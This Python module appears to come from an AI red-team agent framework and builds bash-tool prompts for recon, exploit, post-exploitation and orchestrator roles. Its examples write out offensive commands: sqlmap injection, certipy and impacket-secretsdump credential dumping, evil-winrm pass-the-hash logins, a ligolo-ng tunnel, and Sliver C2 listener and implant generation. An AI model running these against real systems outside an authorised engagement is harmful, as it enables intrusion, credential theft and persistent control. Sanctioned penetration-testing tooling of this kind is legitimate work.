"""Bash tool prompt generation — co-located with the tool implementation.

Separates tool prompt from tool code. The prompt is owned by the tool
and can generate role-specific variations.

Usage:
    from decepticon.tools.bash.prompt import get_bash_prompt
    prompt = get_bash_prompt("recon")   # role-specific bash guidance
    prompt = get_bash_prompt()          # generic bash guidance
"""

from __future__ import annotations

# ── Core bash tool prompt (shared across all roles) ──────────────────────────

_CORE_PROMPT = """\
<BASH_TOOL>
## bash() — Sandbox Execution

All commands execute inside the Docker sandbox via tmux sessions. You have NO access to the host system or Docker CLI.

### Parameters
| Parameter | Default | Description |
|-----------|---------|-------------|
| `command` | `""` | Shell command to execute. Empty = read current screen output |
| `is_input` | `False` | Set `True` ONLY when sending input to a waiting process |
| `session` | `"main"` | Tmux session name. Different names = parallel execution |
| `timeout` | `120` | Max seconds to wait. Use `300` for long compilation (e.g. Sliver `generate`) |
| `background` | `False` | Set `True` for long-running commands. MUST use a dedicated session name |
| `description` | `""` | Short activity label for UI display (e.g., "Scanning target ports") |

### Working Directory & Session State

Each tmux session is a long-lived shell. **Working directory, environment
variables, and background jobs persist across calls** in the same session.

- The session starts in `/workspace/` — that directory is the engagement
  workspace.
- After one `cd` (e.g. `cd recon`), every subsequent `bash(..., session="main")`
  call is already there. Do NOT re-prefix every command with
  `cd /workspace/... && ...` — it wastes tokens and signals confusion to the
  reader. Just run `tail nmap_top1000.txt`, `ls`, etc.
- If you genuinely lost track, run `pwd` once in the session and trust the
  result. Do not re-`cd` defensively.
- Different sessions (`session="scan-1"`, `session="scan-2"`) have INDEPENDENT
  cwd state. A `cd` in `main` does not affect `scan-1`.
- Prefer relative paths (`recon/nmap.txt`) once you are in `/workspace/` over
  absolute (`/workspace/recon/nmap.txt`).

### Output Management

The tool automatically manages output size to preserve context:

| Output Size | Behavior |
|-------------|----------|
| ≤15K chars | Returned inline in tool result |
| >15K chars | Auto-saved to `/workspace/.scratch/`, preview + file path returned |
| >5M chars | **Command killed** (size watchdog). Redirect to file instead |

ANSI escape codes are stripped and repetitive lines are compressed automatically.

**When output is offloaded**: use `read_file` or `grep` to access specific parts from the saved file.
**When size limit hit**: redirect output to a file — `command > /workspace/output.txt`

### Auto-Background

Commands running **>60 seconds** are automatically converted to background mode.
The tool returns a `[AUTO-BACKGROUND]` response with partial output preview.
This prevents long scans from blocking the agent. Check results later:
```
bash(command="", session="<session-name>")
```

### Exit Code Interpretation

On failure, the tool appends a semantic hint after the exit code:
- `Exit code: 126 — permission denied (not executable)` → try with sudo
- `Exit code: 127 — command not found` → install: `apt-get install -y <pkg>`
- `Exit code: 137 — killed (SIGKILL)` → OOM or size limit; redirect output to file
- `Exit code: 143 — terminated (SIGTERM)` → process was terminated externally

### Interactive Programs (sliver-client, msfconsole, evil-winrm, etc.)

Programs that need a TTY or continuous interaction MUST use a dedicated session.

Interactive programs show their own prompt (e.g., `msf6 >`, `sliver >`). The bash tool **auto-detects** this and returns the output immediately with `[session: <name> — interactive, send next command with is_input=True]`. This is NOT a timeout — the program is ready for your next command.

```
# Step 1: Start the interactive program in a named session
bash(command="sliver-client console", session="c2")
# → Returns the Sliver banner + "sliver >" prompt + [session: c2 — interactive]

# Step 2: Send commands to the running program with is_input=True
bash(command="https --lhost 0.0.0.0 --lport 443", is_input=True, session="c2")
bash(command="sessions", is_input=True, session="c2")

# Step 3: Read screen output without sending a command
bash(command="", session="c2")

# Signals
bash(command="C-c", is_input=True, session="c2")   # Ctrl+C — interrupt
bash(command="C-z", is_input=True, session="c2")   # Ctrl+Z — suspend
bash(command="C-d", is_input=True, session="c2")   # Ctrl+D — EOF
```

**Rules:**
- `is_input=False` (default) → starts a NEW command. Use this first.
- `is_input=True` → sends keystrokes to an ALREADY RUNNING process. Only use when a previous command is waiting for input.
- NEVER start with `is_input=True` — the session must have a running process first.
- Do NOT fall back to `nohup ... &` or resource files. Always use the interactive session pattern.
- Do NOT use `sleep` to wait for programs. Use `bash(command="", session="name")` to check state.

### Parallel Execution

Use different session names to run commands in parallel:

```
bash(command="nmap -sV target -oN recon/nmap.txt", session="nmap")
bash(command="curl -sI http://target | head -20", session="main")
```

Each session is independent — one session's timeout or block does not affect others.

### Session Lifecycle

| Output Prefix | Meaning | Action |
|---------------|---------|--------|
| `[IDLE]` | Session ready, no command running | Send new commands |
| `[RUNNING]` | Command still executing | Wait or do other work |
| `[BACKGROUND]` | Command started, not waiting | Do other work, check later |
| `[AUTO-BACKGROUND]` | Long command auto-converted | Do other work, check later |
| `[SIZE LIMIT]` | Output too large, command killed | Redirect to file and retry |
| `[TIMEOUT]` | Command exceeded time limit | Read the screen preview. For interactive programs, use `is_input=True` to continue. For long operations (compilation), retry with higher `timeout` |
| `[ERROR]` | Session crashed or was killed | Will auto-recover on next call |

### write_file — File Creation

**ALWAYS** use `write_file` to create files. NEVER use `bash(command="cat > file << EOF ...")`.

Why: `cat > file << EOF` echoes the entire content back as tool output, wasting context tokens. `write_file` creates files silently.
</BASH_TOOL>"""

# ── Role-specific addons ─────────────────────────────────────────────────────

_ROLE_ADDONS: dict[str, str] = {
    "recon": """\

<BASH_RECON_PATTERNS>
## Recon-Specific bash() Patterns

**Background Execution (REQUIRED for scans >30s)**:
Long-running tools (nmap, subfinder, nuclei, etc.) MUST use `background=True`
with a dedicated session name. After starting a background scan, you MUST immediately
proceed to different work — do NOT check the session status right away.

**Correct pattern — launch scans, do other work, use partial results:**
```
# Step 1: Launch all long scans in parallel
bash(command="nmap -sV --top-ports 1000 target -oN recon/nmap.txt", session="nmap", background=True)
bash(command="nmap -sS -p- target -oN recon/nmap_full.txt", session="nmap_full", background=True)
# Step 2: Do quick recon while scans run (curl, dig, whois — fast commands)
bash(command="curl -sI http://target | head -20", session="main")
bash(command="dig target ANY +short", session="main")
# Step 3: Check completed scans and USE results to start next-phase work
bash(command="", session="nmap")      — [IDLE] means done
read_file("recon/nmap.txt")           — analyze results
# Step 4: Use discovered ports to start deeper enumeration immediately
bash(command="nmap -sC -p 80,443 target -oN ...", session="web_enum", background=True)
bash(command="curl -s http://target/ | head -50", session="main")
```

**WRONG patterns — NEVER do these:**
```
# WRONG: checking session immediately after starting it
bash(command="nmap ...", session="nmap", background=True)
bash(command="", session="nmap")

# WRONG: sleeping to wait instead of doing productive work
bash(command="sleep 30 && tail recon/nmap.txt", session="main")
```

**Key**: Always save scan output to files with `-oN`/`-o` flags — results persist even after context is cleared.
</BASH_RECON_PATTERNS>""",
    "exploit": """\

<BASH_EXPLOIT_PATTERNS>
## Exploit-Specific bash() Patterns

**Parallel exploitation** of independent targets:
```
bash(command="sqlmap -u 'http://target1/page?id=1' --batch", session="sqli-1")
bash(command="certipy find -u user@domain -p pass -dc-ip 10.0.0.1", session="adcs-1")
```

**Long-running exploits**: Use timeout parameter — `bash(command="...", timeout=300)`

**Evidence capture**: Always redirect output to files for the evidence trail:
```
bash(command="sqlmap ... --output-dir=exploit/sqlmap_target1/")
bash(command="impacket-secretsdump ... 2>&1 | tee exploit/secretsdump.txt")
```
</BASH_EXPLOIT_PATTERNS>""",
    "postexploit": """\

<BASH_POSTEXPLOIT_PATTERNS>
## PostExploit-Specific bash() Patterns

**Parallel Sessions for Multi-Host Ops**:
```
bash(command="evil-winrm -i 10.0.0.5 -u admin -H <hash>", session="host-5")
bash(command="evil-winrm -i 10.0.0.10 -u admin -H <hash>", session="host-10")
bash(command="ligolo-ng agent --connect 10.0.0.1:443 --retry", session="tunnel")
```

**C2 Management** (Sliver server runs in separate `c2-sliver` container):
Do NOT run `sliver-server` or generate operator configs — use the pre-generated config.
The bash tool auto-detects interactive prompts (like `sliver >`) and returns output immediately.
Do NOT fall back to background execution (`nohup`, `&`, resource files). Always use the interactive session pattern.
```
bash(command="sliver-client import /workspace/.sliver-configs/decepticon.cfg", session="c2")
bash(command="sliver-client console", session="c2")
bash(command="https -l 443 -d c2-sliver", is_input=True, session="c2")
bash(command="generate --mtls c2-sliver:8888 --os linux --skip-symbols --save /workspace/exploit/", is_input=True, session="c2", timeout=300)
bash(command="sessions", is_input=True, session="c2")
bash(command="use <SESSION_ID>", is_input=True, session="c2")
```
</BASH_POSTEXPLOIT_PATTERNS>""",
    "decepticon": """\

<BASH_ORCHESTRATOR_PATTERNS>
## Orchestrator bash() Usage

As the orchestrator, you use bash ONLY for reading/writing state files — NOT for offensive operations.

**Permitted uses:**
```
bash(command="cat /workspace/plan/opplan.json")
bash(command="ls /workspace/")
bash(command="nc -z c2-sliver 31337 && echo 'C2_OK' || echo 'C2_DOWN'")
```

**Delegate offensive operations** to sub-agents via `task()`. Do NOT run scans or exploits directly.
</BASH_ORCHESTRATOR_PATTERNS>""",
}


def get_bash_prompt(role: str | None = None) -> str:
    """Generate the bash tool prompt, optionally with role-specific addons.

    Args:
        role: Agent role name (recon, exploit, postexploit, decepticon).
            If None, returns only the core bash tool prompt.

    Returns:
        Complete bash tool prompt string for embedding in system prompt.
    """
    prompt = _CORE_PROMPT
    if role and role in _ROLE_ADDONS:
        prompt += _ROLE_ADDONS[role]
    return prompt
